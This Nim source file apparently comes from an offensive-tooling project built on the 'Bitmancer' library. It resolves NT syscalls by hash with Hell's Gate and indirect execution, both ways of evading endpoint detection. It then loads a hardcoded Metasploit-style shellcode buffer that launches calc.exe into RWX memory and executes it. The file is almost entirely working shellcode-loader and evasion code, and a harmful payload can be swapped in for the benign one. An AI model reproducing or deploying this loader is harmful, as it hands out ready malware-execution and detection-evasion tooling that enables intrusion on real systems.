import ../Bitmancer/syscalls
import ../Bitmancer/core/obfuscation/hash

# 
# Additional types

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST


# ----------------------------------------------------------------------------
# Define syscalls

type 
    NtClose                 = proc(h: HANDLE): NTSTATUS {.stdcall, gcsafe.}
    NtOpenProcess           = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall, gcsafe.}
    NtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall, gcsafe.}
    NtWriteVirtualMemory    = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall, gcsafe.}
    NtCreateThreadEx        = proc(TreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall, gcsafe.}

const
    NtCloseHash                 = ctDjb2 "NtClose"
    NtOpenProcessHash           = ctDjb2 "NtOpenProcess"
    NtAllocateVirtualMemoryHash = ctDjb2 "NtAllocateVirtualMemory"
    NtWriteVirtualMemoryHash    = ctDjb2 "NtWriteVirtualMemory"
    NtCreateThreadExHash        = ctDjb2 "NtCreateThreadEx"

genSyscall(NtClose)       # Macro creates function NtCloseWrapper
genSyscall(NtOpenProcess) 
genSyscall(NtAllocateVirtualMemory)
genSyscall(NtWriteVirtualMemory)
genSyscall(NtCreateThreadEx)

# ----------------------------------------------------------------------------
# Configure Bitmancer

const 
    symEnum = SymbolEnumeration.UseEAT
    ssnEnum = SsnEnumeration.HellsGate
    exeEnum = SyscallExecution.Indirect

# ----------------------------------------------------------------------------
# Resolve syscalls

let 
    Ntdll = NTDLL_BASE().valueOr():
        echo "Failed to find NTDLL"
        quit()

    NtCloseSyscall                 = ctGetNtSyscall[NtClose](Ntdll, ModuleHandle(NULL), NtCloseHash, symEnum, ssnEnum, exeEnum)
    NtOpenProcessSyscall           = ctGetNtSyscall[NtOpenProcess](Ntdll, ModuleHandle(NULL), NtOpenProcessHash, symEnum, ssnEnum, exeEnum)
    NtAllocateVirtualMemorySyscall = ctGetNtSyscall[NtAllocateVirtualMemory](Ntdll, ModuleHandle(NULL), NtAllocateVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
    NtWriteVirtualMemory           = ctGetNtSyscall[NtWriteVirtualMemory](Ntdll, ModuleHandle(NULL), NtWriteVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
    NtCreateThreadEx               = ctGetNtSyscall[NtCreateThreadEx](Ntdll, ModuleHandle(NULL), NtCreateThreadExHash, symEnum, ssnEnum, exeEnum)

# ----------------------------------------------------------------------------
# Basic Injection

proc inject(): NtResult =
    # I think this is a msf calc.exe payload :-)
    var buf: array[276, byte] = [
        byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
        0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
        0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
        0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
        0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
        0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
        0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
        0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
        0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
        0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
        0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
        0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
        0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
        0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
        0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
        0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
        0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
        0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
        0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,
        0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
        0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
        0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
        0x00]
    
    
    var sc_size: SIZE_T = cast[SIZE_T](buf.len)
    var dest: LPVOID
    var ret = NtAllocateVirtualMemoryWrapper(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE, NtAllocateVirtualMemorySyscall.wSyscall, NtAllocateVirtualMemorySyscall.pSyscall, NtAllocateVirtualMemorySyscall.pFunction)
    
    var bytesWritten: SIZE_T
    ret = NtWriteVirtualMemoryWrapper(getCurrentProcess(), dest, unsafeAddr buf, sc_size-1, addr bytesWritten, NtWriteVirtualMemorySyscall.wSyscall, NtWriteVirtualMemorySyscall.pSyscall, NtWriteVirtualMemorySyscall.pFunction)
    
    let f = cast[proc(){.nimcall.}](dest)
    f()
